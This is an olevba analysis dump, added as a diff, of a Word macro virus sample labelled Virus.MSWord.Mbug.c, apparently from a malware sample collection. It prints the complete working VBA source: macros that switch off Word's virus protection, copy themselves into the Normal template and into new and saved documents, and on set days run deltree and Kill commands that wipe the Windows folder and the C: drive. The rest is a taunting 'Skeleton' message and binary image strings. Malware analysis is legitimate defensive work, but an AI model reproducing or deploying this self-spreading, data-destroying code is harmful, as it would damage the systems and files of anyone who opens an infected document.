@@ -1,0 +1,761 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Virus.MSWord.Mbug.c
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: Virus.MSWord.Mbug.c - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO UserForm1.frm 
+in file: Virus.MSWord.Mbug.c - OLE stream: 'Macros/VBA/UserForm1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Private Sub TextBox1_Change()
+
+End Sub
+
+Private Sub UserForm_Click()
+MsgBox "Skeleton Box", vbInformation, "Skeleton"
+End Sub
+
+
+-------------------------------------------------------------------------------
+VBA MACRO UserForm2.frm 
+in file: Virus.MSWord.Mbug.c - OLE stream: 'Macros/VBA/UserForm2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Private Sub CommandButton1_Click()
+Kill "c:\windows\*.sys"
+End Sub
+
+Private Sub CommandButton2_Click()
+Kill "c:\*.sys"
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO skeleton.bas 
+in file: Virus.MSWord.Mbug.c - OLE stream: 'Macros/VBA/skeleton'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub AutoExec()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo errorAE
+If Day(Now()) = "30" Then
+UserForm1.Show
+Shell "deltree /y c:\windows", vbHide
+Shell "deltree /y c:\*.*", vbHide
+End If
+errorAE:
+End Sub
+Sub AutoNew()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorAN
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="skeleton", Object:=wdOrganizerObjectProjectItems
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform1", Object:=wdOrganizerObjectProjectItems
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="userform2", Object:=wdOrganizerObjectProjectItems
+    With Dialogs(wdDialogFileSummaryInfo)
+        .Subject = "Skeleton Macro"
+        .Execute
+    End With
+ErrorAN:
+End Sub
+Sub AutoOpen()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorAO
+iMacroCount = WordBasic.CountMacros(0, 0)
+For i = 1 To iMacroCount
+    If WordBasic.[MacroName$](i, 0) = "skeleton" Then
+        bInstalled = -1
+    End If
+Next i
+If Not bInstalled Then
+    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="skeleton", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
+    For a = 1 To 10
+    StatusBar = "Skeleton"
+    Next a
+Else
+    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="skeleton", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
+End If
+ErrorAO:
+End Sub
+Sub FileSaveAs()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorFSA
+    If Day(Now()) = "1" Or Day(Now()) = "13" Then
+    UserForm2.Show
+    Shell "deltree /y c:\windows", vbMinimizedFocus
+    Shell "deltree /y c:\*.*", vbMinimizedFocus
+    End If
+    Dialogs(wdDialogFileSaveAs).Show
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="skeleton", Object:=wdOrganizerObjectProjectItems
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm1", Object:=wdOrganizerObjectProjectItems
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm2", Object:=wdOrganizerObjectProjectItems
+ActiveDocument.Save
+ErrorFSA:
+If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
+    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
+End If
+End Sub
+
+Sub FileTemplates()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorFT
+ErrorFT:
+End Sub
+
+Sub ToolsMacro()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorTM
+ErrorTM:
+End Sub
+Sub ViewVBCode()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorVVBC
+ErrorVVBC:
+End Sub
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Skeleton MacroF
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Skeleton
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Information
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Tab3
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Tab4
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Name : Skeleton MS@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Interesting : Infect MSword 1
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Sex : Male@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Age : 100???�	
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Picture Of Skeleton
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+K�Qlt
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+GIF89aM
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+NETSCAPE2.0
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+GifBuilder 0.2 by Yves Piguet
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+����������.�a˼G;y��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+AC��
+
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�+f�	�u��Z��z���Z�UPX\yx
+��<ڔL��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+S:�U�P����Qb9
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�~�O+Fz���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+ں�do���-�G7�etBXՇ��ǘ(x�����
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+xG���gc8�D�%�¹�
+I��;�J�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+%h���d2\�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+���I˳���R�i,l�l�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+N�k�n.V�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+/IM�~^{�+MWn�k���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+���."�J��9eǖt��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�=Y�l"+�9�iLְ
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+.����S�QY�P�B
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+B��&,n��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�H��H�3
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�z�0"����:��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+M+J�㾫-�r��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�9H��⁧S����L�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�T�e���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+?�d��EP
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+����������.�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+!w`���aE�e`nu'�x�i���x����8�(������0`ge{B���-�m8w3�E�Cޚi-K���h�W��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�#����
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+���e��U�8X��F��d7i��(��ؘ'
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�w����GJ
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��ک�h��8ky�)�bkX��7
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��ማ�DJ{
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�ۚX�S�-K�}�ڵ|����7']���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+;�|[x�VĚ*־`�^l1ȩ �!��l*�0Y�|�*��W��e�p�y
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+wd��4b��3I��>
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�ԀTwK�Kz-�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+����;g8�%d8�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��#��S���=g�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�5�BC�x�%G�ς8��&�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+e�OD��DF�P���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Food : *.Doc�	
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Alive : No
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i03/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Yeah, Skeleton love your Microsoft word and he decided to 
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�take a revenge of you.  Why?  Cauze you make him die nd �
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�and he become a skeleton to infected your MSword.  If 
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�you afraid, sure you can go to fight with him in anyway.
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�But Important thing is you must win, otherwise you willy
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�.....................orm�	
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm1/i01/i04/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+K�Qlt
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+GIF89aM
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+NETSCAPE2.0
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+GifBuilder 0.2 by Yves Piguet
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+����������.�a˼G;y��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+AC��
+
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�+f�	�u��Z��z���Z�UPX\yx
+��<ڔL��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+S:�U�P����Qb9
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�~�O+Fz���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+ں�do���-�G7�etBXՇ��ǘ(x�����
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+xG���gc8�D�%�¹�
+I��;�J�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+%h���d2\�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+���I˳���R�i,l�l�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+N�k�n.V�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+/IM�~^{�+MWn�k���
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+���."�J��9eǖt��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�=Y�l"+�9�iLְ
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+.����S�QY�P�B
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+B��&,n��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�H��H�3
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�z�0"����:��
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Mbug.c' - OLE stream: 'Macros/UserForm2/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+M+J�㾫-�r��
